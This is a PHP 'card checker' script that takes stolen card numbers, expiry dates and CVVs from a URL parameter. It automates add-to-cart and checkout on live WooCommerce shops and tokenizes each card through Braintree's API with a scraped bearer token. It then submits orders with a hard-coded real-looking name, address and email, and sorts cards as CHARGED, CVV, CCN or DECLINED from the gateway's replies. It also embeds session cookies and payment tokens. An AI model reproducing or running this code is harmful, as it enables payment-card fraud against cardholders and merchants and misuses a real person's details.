<?php

require "z.php";


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];



$startTime = microtime(true);
$Somnus = 0;

som:

//1st curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giantloopmoto.com/cart/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();
$headers[] = 'authority: www.giantloopmoto.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$a = curl_exec($ch);
$stocklevel = trim(strip_tags(v($a, '<input type="hidden" name="gtm4wp_stocklevel" value="','"/>')));



//2nd curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giantloopmoto.com/product/giant-loop-lift-strap/');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '------WebKitFormBoundary6mCQPcolwSUjho1a
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundary6mCQPcolwSUjho1a
Content-Disposition: form-data; name="add-to-cart"

8324
------WebKitFormBoundary6mCQPcolwSUjho1a
Content-Disposition: form-data; name="gtm4wp_product_data"

{"internal_id":8324,"item_id":8324,"item_name":"Giant Loop\u00ae Lift Strap","sku":"LIFT22","price":20,"stocklevel":'.$stocklevel.',"stockstatus":"instock","google_business_vertical":"retail","item_category":"Hard Parts","item_category2":"Straps","id":8324}
------WebKitFormBoundary6mCQPcolwSUjho1a--';

$headers = array();
$headers[] = 'authority: www.giantloopmoto.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary6mCQPcolwSUjho1a';
$headers[] = 'origin: https://softfloor.co.uk';
$headers[] = 'referer: https://www.giantloopmoto.com/product/giant-loop-lift-strap/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));

$b = curl_exec($ch);


//3rd curl
# CHECKOUT

//4th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giantloopmoto.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();
$headers[] = 'authority: www.giantloopmoto.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'referer: https://softfloor.co.uk/cart/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$client_token = trim(strip_tags(v($d, 'var wc_braintree_client_token = ["','=="];')));
$decodedToken = base64_decode($client_token);
$tokenData = json_decode($decodedToken, true);
$bearer = $tokenData['authorizationFingerprint'];

//echo $client_token.'<br>';
//echo 'TokenData: '.$decodedToken.'<br>';
//echo 'Bearer: '.$bearer.'<br>';
//echo 'Nonce: '.$n.'<br>';



//5th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"33cd1963-18bf-4e31-9322-1d433ca89456"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv1.'","billingAddress":{"postalCode":"WD24 6PQ"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';


$headers = array();
$headers[] = 'authority: payments.braintree-api.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'authorization: Bearer '.$bearer.'';
//$headers[] = 'braintree-version: 2016-10-07';
$headers[] = 'braintree-version: 2018-05-10';
$headers[] = 'connection: keep-alive';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

$a = curl_exec($ch);
$ro1 = json_decode($a);
$token = $ro1->data->tokenizeCreditCard->token;

//echo 'Token: '.$token.'<br>';
echo $a.'<br>';


//6th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://softfloor.co.uk/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'billing_email=tricialansangan1%40gmail.com&billing_phone=01923250460&billing_first_name=Tricia&billing_last_name=Lansangan&billing_company=&billing_country=GB&billing_address_1=320+St+Albans+Rd&billing_address_2=&billing_city=Watford&billing_state=Hertfordshire&billing_postcode=WD24+6PQ&shipping_first_name=Tricia&shipping_last_name=Lansangan&shipping_company=&shipping_country=GB&shipping_address_1=320+St+Albans+Rd&shipping_address_2=&shipping_city=Watford&shipping_state=Hertfordshire&shipping_postcode=WD24+6PQ&additional_safe_place=no&order_comments=&shipping_method%5B0%5D=local_pickup%3A2&payment_method=braintree_cc&braintree_cc_nonce_key='.$n.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22b7e4524845fdd65f1a8a52a9b9d3ec7f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22a876f18d1f8cbe3e66666a4e0b9224ab%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fgdnpq7p2cm6qpfdj%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fgdnpq7p2cm6qpfdj%22%7D%2C%22merchantId%22%3A%22gdnpq7p2cm6qpfdj%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22gdnpq7p2cm6qpfdj%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxMzZiN2Y1Mi0xM2ZlLTRhZjctYjY5OC0yMTczM2JhM2IyOWQiLCJpYXQiOjE3MjM4ODQ5ODksImV4cCI6MTcyMzg5MjE4OSwiaXNzIjoiNjAwOGNhN2JjYzhkYjM2NzEyZWM4ZjlkIiwiT3JnVW5pdElkIjoiNjAwOGNhN2I4YmI2ZTY1MzQ4ZjI1MjFjIn0.OJIJ8QLCr43blNSbOLs0Imv8NZ85CWynyYoDvfcUKtY%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Duramat+Limited%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjM5NzEzODksImp0aSI6IjU4M2VhZDdhLTEwNzAtNDkyMC05OTFiLTBlMWIzN2FmNTEwMSIsInN1YiI6ImdkbnBxN3AyY202cXBmZGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImdkbnBxN3AyY202cXBmZGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.B_6jC48DR1mkCSw7zQPM0Fkc0-3aLJLoX7oQCKOIAKHfmSg58RaMntLmnfJz8QwZqa6_n3Pt_b9ijeoQbiUlJQ%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Duramat+Limited%22%2C%22clientId%22%3A%22Af5TOPmxS55sgW_ZHmVwhty0-T1I7mEf5tzomwKSIaY50l7F5zQE8hWqoa5WHDD46yYRZunjaOQ2QxcZ%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22softfloorGBP%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%22b7e4524845fdd65f1a8a52a9b9d3ec7f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22a876f18d1f8cbe3e66666a4e0b9224ab%22%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%22b7e4524845fdd65f1a8a52a9b9d3ec7f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22a876f18d1f8cbe3e66666a4e0b9224ab%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%22b7e4524845fdd65f1a8a52a9b9d3ec7f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22a876f18d1f8cbe3e66666a4e0b9224ab%22%7D&terms=on&terms-field=1&i13_checkout_token=&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&i13_checkout_token='.$token.'&i13_checkout_token='.$token.'';


$headers = array();
$headers[] = 'authority: softfloor.co.uk';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: wp_woocommerce_session_63b3dfa4a6dd74ac88d5c19ff65b7c47=t_f7f8a6bf61452f6da52a7a016205b4%7C%7C1723890382%7C%7C1723889782%7C%7Cfe0d0829ed3051785a8926a18f1eea6b; _fbp=fb.2.1723883203156.898073705598443098; cookieyes-consent=consentid:MkV3d1ZJRUhPUGFyMW8xUGRNaDZSNXlNNEkwcVRUTlA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _gcl_au=1.1.649142065.1723883203; _clck=1csxmn7%7C2%7Cfoe%7C0%7C1690; _ga=GA1.1.1110442066.1723883240; wp_automatewoo_visitor_63b3dfa4a6dd74ac88d5c19ff65b7c47=7c8tfwld2nu4ip3ig0gl; wp_automatewoo_session_started=1; woocommerce_items_in_cart=1; woocommerce_cart_hash=9ffe9229ab81a7a8a3cfafd80486c6a2; _ga_VBC7211JBN=GS1.1.1723883240.1.1.1723884982.0.0.0; _uetsid=895766005c7211ef9791a15378126e61; _uetvid=895a14305c7211ef87bd1bfefee4acf5; _clsk=ahnlav%7C1723885003075%7C18%7C1%7Co.clarity.ms%2Fcollect; _ga_3M6JGEWXNH=GS1.1.1723883131.1.1.1723885176.60.0.0';
$headers[] = 'origin: https://softfloor.co.uk';
$headers[] = 'referer: https://softfloor.co.uk/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

$e = curl_exec($ch);
$ro2 = json_decode($e, true);;
$result = $ro2['result'];
$message = strpos($ro2['messages'], 'Reason:');
$messageReason = $message !== false ? substr($ro2['messages'], $message + strlen('Reason:')) : '';
$messageReason = trim($messageReason);
$url = $ro2['redirect'];
$od = $ro2['order_id'];

$endTime = microtime(true);
$overallTime = $endTime - $startTime;
echo $e;
//echo '<br>Result: '.$result.'  Message Reason: '.$messageReason;


if(strpos($messageReason, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if(strpos($messageReason, 'Card Issuer Declined CVV') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ B3 + Woo ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if(strpos($messageReason, 'Insufficient Funds') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div><br></div>';
}
else if($messageReason === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if($messageReason === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if($messageReason === 'Processor Declined - Fraud Suspected'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
elseif(strpos($e, 'session has expired') )
{ $Somnus++;
   goto som; 
}
else if (empty($e)) {
  goto som;
}
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}


curl_close($ch);
ob_flush();
unlink($cx);
?>